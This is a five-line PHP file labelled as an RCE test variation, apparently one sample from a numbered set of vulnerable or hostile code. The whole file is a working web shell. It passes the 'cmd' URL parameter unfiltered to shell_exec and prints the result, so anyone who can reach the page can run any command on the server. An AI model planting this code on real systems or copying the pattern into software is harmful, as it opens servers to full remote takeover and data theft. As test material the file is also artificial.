<?php
// RCE test variation #306
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>